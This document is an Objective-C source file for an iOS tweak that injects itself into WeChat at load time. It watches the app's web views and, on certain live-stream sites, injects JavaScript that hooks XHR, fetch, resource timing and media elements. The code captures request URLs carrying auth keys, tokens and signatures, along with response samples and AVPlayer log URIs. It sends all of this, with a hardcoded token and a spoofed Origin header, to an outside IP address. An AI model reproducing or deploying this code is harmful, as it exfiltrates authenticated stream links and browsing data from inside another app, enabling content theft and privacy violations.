//
// ALIInjectOnEnter_Popup.m
// 进入目标 H5 才注入；注入成功&抓到URL都弹窗+复制；带安全重试避免 WeChat 闪退。
// 编译：-framework WebKit -framework AVFoundation -framework UIKit -framework Foundation
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kScanInterval     = 1.0;   // 扫描 WK 窗口
static const NSTimeInterval kInjectDelay      = 0.50;  // 命中域名后再延迟注入
static const NSTimeInterval kDedupeWindow     = 60.0;  // URL 去重
static const double        kProgressThreshold = 0.55;  // 文档就绪门限

static const BOOL kPopupOnInject = YES;   // 注入成功弹窗
static const BOOL kPopupOnHit    = YES;   // 抓到 URL 弹窗
static const BOOL kCopyOnHit     = YES;   // 抓到/注入时复制
static const BOOL kForceUploadAll= YES;   // 兜底上报所有 URL

// 仅这些域名才注入
static NSArray<NSString*> *TargetHosts(void){
    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
}

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI-INJ] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - 前置声明

static void installAVObservers(void);
static void scan_loop(void);
static void handleRawEvent(NSDictionary *evt);
static void handleCapturedURL(NSString *url, NSString *from);
static void postText(NSString *text);
static NSString *jsonStringify(NSDictionary *obj);

#pragma mark - 全局

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;

#pragma mark - 小工具（安全弹窗）

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIScene *s in UIApplication.sharedApplication.connectedScenes) {
            if (![s isKindOfClass:[UIWindowScene class]]) continue;
            UIWindowScene *sc = (UIWindowScene*)s;
            if (sc.activationState==UISceneActivationStateForegroundActive) {
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}

// 可重试的安全弹窗（避免 WeChat 转场阶段崩溃）
static void popup_safe(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        __block int tries = 0;
        void (^tryPresent)(void) = ^{
            @try{
                UIWindow *w = keyWin(); if (!w){ goto RETRY; }
                UIViewController *vc = w.rootViewController; if (!vc){ goto RETRY; }
                // 如果还有别的控制器在 present，等它结束（避免 "presenting view controllers on detached view controllers" 崩溃）
                while (vc.presentedViewController) vc = vc.presentedViewController;
                if (!vc.view.window){ goto RETRY; }

                UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
                if (copyText.length){
                    [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                        UIPasteboard.generalPasteboard.string = copyText;
                    }]];
                }
                [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
                [vc presentViewController:ac animated:YES completion:nil];
                return;
            }@catch(__unused NSException *e){}
        RETRY:
            if (tries++ < 6){ // 最多重试 ~1.8s
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.3 * NSEC_PER_SEC)), dispatch_get_main_queue(), tryPresent);
            }
        };
        tryPresent();
    });
}

static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"ukmdg"]||[s containsString:@"vzuk"]||[s containsString:@"wehfws"]) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

#pragma mark - 上报

static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body){
    if (idx >= paths.count) return;
    NSString *url = [kPushHost stringByAppendingString:paths[idx]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
    req.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
        NSInteger sc = [r isKindOfClass:[NSHTTPURLResponse class]] ? ((NSHTTPURLResponse*)r).statusCode : -1;
        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx+1, body);
    }] resume];
}
static void postText(NSString *text){
    if (!text) return;
    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
}
static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

#pragma mark - 统一事件处理（JS / 原生）

static void handleRawEvent(NSDictionary *evt){
    NSString *js = jsonStringify(evt); if (js) postText(js);

    NSString *u = evt[@"url"];
    if (!u) return;

    BOOL like = looksLikeStream(u);
    if (kForceUploadAll || like){
        if (!dedupe_skip(u)){
            if (kPopupOnHit){ if (kCopyOnHit) UIPasteboard.generalPasteboard.string = u;
                popup_safe(@"抓到 URL", [NSString stringWithFormat:@"%@\n%@", evt[@"from"]?:evt[@"type"]?:@"inpage", u], u);
            } else if (kCopyOnHit) { UIPasteboard.generalPasteboard.string = u; }
            NSDictionary *hit = @{@"type": @"JS_HIT",
                                  @"from": evt[@"from"] ?: evt[@"type"] ?: @"inpage",
                                  @"url": u,
                                  @"page": evt[@"page"] ?: @"",
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s2 = jsonStringify(hit); if (s2) postText(s2);
        }
    }
}

static void handleCapturedURL(NSString *url, NSString *from){
    if (!url) return;
    if (dedupe_skip(url)) return;

    NSDictionary *evt = @{@"type": @"NATIVE_HIT",
                          @"from": from ?: @"native",
                          @"url": url,
                          @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
    NSString *s = jsonStringify(evt); if (s) postText(s);

    if (looksLikeStream(url)){
        if (kPopupOnHit){ if (kCopyOnHit) UIPasteboard.generalPasteboard.string = url;
            popup_safe(@"捕获播放/请求 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
        } else if (kCopyOnHit) { UIPasteboard.generalPasteboard.string = url; }
    }
}

#pragma mark - inpage JS（与前版一致）

static NSString *inpageJS(void){
    return @
    "(function(){try{"
      "function send(t,data){try{var p=data||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
        "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);} }catch(e){}}"
      "function looks(u){if(!u)return false;u=(''+u).toLowerCase();"
        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.mp4')!=-1||u.indexOf('.ts')!=-1)return true;"
        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1)return true;"
        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('ukmdg')!=-1||u.indexOf('vzuk')!=-1||u.indexOf('wehfws')!=-1)return true;return false;}"
      "send('INJECT_OK',{});"
      "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
        "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
        "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
          "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
            "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
            "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
          "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
      "})();"
      "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
        "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u)send('FETCH_REQ',{from:'fetch',url:u,method:m});"
          "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
            "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url=u,method:m,status:st,ctype:ct});});}"
            "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
        "catch(e){return F.apply(this,arguments)}})();"
      "(function(){if(!('PerformanceObserver'in window)||window.__ali_perf__)return;window.__ali_perf__=true;"
        "try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))send('HIT',{from:'perf',url:u});}}catch(e){}});"
        "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
      "(function(){if(window.__ali_media__)return;window.__ali_media__=true;"
        "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))send('HIT',{from:tag,url:s});}}catch(e){}}"
        "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];"
          "if(n&&n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} }"
          "if(n&&n.querySelectorAll){var vs=n.querySelectorAll('video,audio');for(var j=0;j<vs.length;j++){var t2=vs[j].tagName.toLowerCase();report(vs[j],t2,'sub');vs[j].addEventListener&&vs[j].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}});});"
        "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
        "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
        "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))send('HIT',{from:'setAttr',url:v});}}}catch(e){}return setA.apply(this,arguments)};}"
      "})();"
    "}catch(e){}})();";
}

#pragma mark - WK 注入（只在命中域名时注入 + 弹窗提示）

@interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
@end
@implementation ALIMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.body isKindOfClass:[NSDictionary class]]) return;
    handleRawEvent((NSDictionary *)message.body);
}
@end
static ALIMessageHandler *g_handler = nil;

static const void *kInjectedKey = &kInjectedKey;
static const void *kKVOKey      = &kKVOKey;

static BOOL hostMatches(NSURL *url){
    if (!url.host) return NO;
    NSString *h = url.host.lowercaseString;
    for (NSString *pat in TargetHosts()){
        if ([h hasSuffix:pat.lowercaseString]) return YES;
    }
    return NO;
}

static void prime_userScript_for_allFrames(WKWebView *wv){
    if (!wv) return;
    @try{
        WKUserContentController *ucc = wv.configuration.userContentController;
        for (WKUserScript *s in ucc.userScripts){
            if ([s.source containsString:@"__ALI_SNIF__"]) return;
        }
        WKUserScript *us = [[WKUserScript alloc] initWithSource:inpageJS()
                                                  injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
                                               forMainFrameOnly:NO];
        [ucc addUserScript:us];
        if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
            @try{ [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
        }
    }@catch(__unused NSException *e){}
}

static void try_inject_when_ready(WKWebView *wv){
    if (!wv) return;
    if (wv.estimatedProgress < kProgressThreshold) return;

    [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
        if (err) return;
        NSString *rs = [val isKindOfClass:[NSString class]] ? val : @"";
        if (![rs isEqualToString:@"complete"] && ![rs isEqualToString:@"interactive"]) return;

        NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
        if (flag.boolValue) return;

        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            NSURL *u = wv.URL; if (!hostMatches(u)) return;

            objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);

            if (!g_handler) g_handler = [ALIMessageHandler new];
            @try{
                if ([wv.configuration.userContentController respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
                    [wv.configuration.userContentController removeScriptMessageHandlerForName:@"__ALI_SNIF__"];
                }
                [wv.configuration.userContentController addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"];
            }@catch(__unused NSException *e){}

            [wv evaluateJavaScript:inpageJS() completionHandler:nil];

            // 注入成功：一定弹窗提示
            if (kPopupOnInject){
                NSString *p = wv.URL.absoluteString ?: @"";
                if (kCopyOnHit) UIPasteboard.generalPasteboard.string = p;
                popup_safe(@"JS 注入成功", [NSString stringWithFormat:@"已进入：%@\n开始采集（XHR/fetch/资源/Media）", wv.URL.host ?: @"(null)"], nil);
            }
            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                  @"app": @"WeChat",
                                  @"page": (wv.URL.absoluteString ?: @""),
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt); if (s) postText(s);
        });
    }];
}

@interface _ALIKVOBox : NSObject
@property (nonatomic, weak) WKWebView *wv;
@end
@implementation _ALIKVOBox
- (void)dealloc{
    @try{
        [self.wv removeObserver:self forKeyPath:@"URL"];
        [self.wv removeObserver:self forKeyPath:@"estimatedProgress"];
    }@catch(__unused NSException *e){}
}
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
    WKWebView *wv = (WKWebView *)object;
    if (![wv isKindOfClass:[WKWebView class]]) return;
    if ([keyPath isEqualToString:@"URL"] || [keyPath isEqualToString:@"estimatedProgress"]) {
        NSURL *u = wv.URL;
        if (hostMatches(u)) { prime_userScript_for_allFrames(wv); try_inject_when_ready(wv); }
    }
}
@end

static void attach_kvo_if_needed(WKWebView *wv){
    if (!wv) return;
    _ALIKVOBox *box = objc_getAssociatedObject(wv, kKVOKey);
    if (box) return;
    box = [_ALIKVOBox new]; box.wv = wv;
    objc_setAssociatedObject(wv, kKVOKey, box, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    @try{
        [wv addObserver:box forKeyPath:@"URL" options:NSKeyValueObservingOptionNew context:NULL];
        [wv addObserver:box forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:NULL];
    }@catch(__unused NSException *e){}
}

static void walk_view(UIView *v){
    if (!v) return;
    Class WK = NSClassFromString(@"WKWebView");
    if (WK && [v isKindOfClass:WK]){
        WKWebView *wv = (WKWebView *)v;
        attach_kvo_if_needed(wv);
        if (hostMatches(wv.URL)) { prime_userScript_for_allFrames(wv); try_inject_when_ready(wv); }
    }
    for (UIView *sub in v.subviews) walk_view(sub);
}

static void scan_loop(void){
    on_main(^{
        @try{ for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w); }@catch(__unused NSException *e){}
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
}

#pragma mark - AV AccessLog（不 swizzle）

static void installAVObservers(void){
    @try{
        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        if (!g_accessLogToken1){
            g_accessLogToken1 = [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(accessLog)]) {
                        id log = [item accessLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            id ev = [log events].lastObject;
                            SEL sel = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            if (ev && [ev respondsToSelector:sel]) {
                                NSString *uri = [ev performSelector:sel];
                                if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVAccessLog"); });
                            }
#pragma clang diagnostic pop
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
        if (!g_accessLogToken2){
            g_accessLogToken2 = [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(errorLog)]) {
                        id log = [item errorLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            for (id ev in [log events]){
                                SEL sel2 = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                if (ev && [ev respondsToSelector:sel2]) {
                                    NSString *uri2 = [ev performSelector:sel2];
                                    if (uri2.length) dispatch_async(gq, ^{ handleCapturedURL(uri2, @"AVErrorLog"); });
                                }
#pragma clang diagnostic pop
                            }
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
    }@catch(__unused NSException *e){}
}

#pragma mark - 入口

__attribute__((constructor))
static void ALIInjectOnEnter_Popup_Init(void){
    if (!gq)    gq    = dispatch_queue_create("com.ali.inject.onenter.popup", DISPATCH_QUEUE_SERIAL);
    if (!g_seen) g_seen = [NSMutableDictionary dictionary];
    scan_loop();
    installAVObservers();
    NSDictionary *evt = @{@"type": @"LOADER_INIT", @"app": @"WeChat",
                          @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
    NSString *s = jsonStringify(evt); if (s) postText(s);
}
